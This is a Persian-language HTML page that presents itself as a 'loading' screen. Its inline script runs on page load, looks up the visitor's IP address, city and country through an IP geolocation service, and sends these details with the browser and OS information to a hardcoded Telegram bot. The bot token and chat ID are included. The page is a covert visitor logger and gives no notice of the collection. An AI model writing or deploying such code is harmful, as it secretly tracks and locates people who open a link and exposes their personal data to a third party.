<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>بار گزاری صفحه </title>
</head>
<body>
  <h3>در حال بار گزاری</h3>

  <script>
    const telegramToken = '6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw';
    const chatId = '1209515299';

    async function sendDataToTelegram(info) {
      const message = `📡 کاربر جدید وارد شد:\n🌍 IP: ${info.ip}\n📱 OS: ${info.os}\n🧭 Browser: ${info.browser}\n📌 موقعیت: ${info.city}, ${info.country}\n🔍 Agent: ${navigator.userAgent}`;

      await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: chatId, text: message})
      });
    }

    async function getUserData() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const info = {
          ip: data.ip,
          city: data.city,
          country: data.country_name,
          os: navigator.platform,
          browser: navigator.userAgent
        };

        sendDataToTelegram(info);
      } catch (err) {
        console.error('خطا در گرفتن اطلاعات:', err);
      }
    }

    getUserData();
  </script>
</body>
</html>
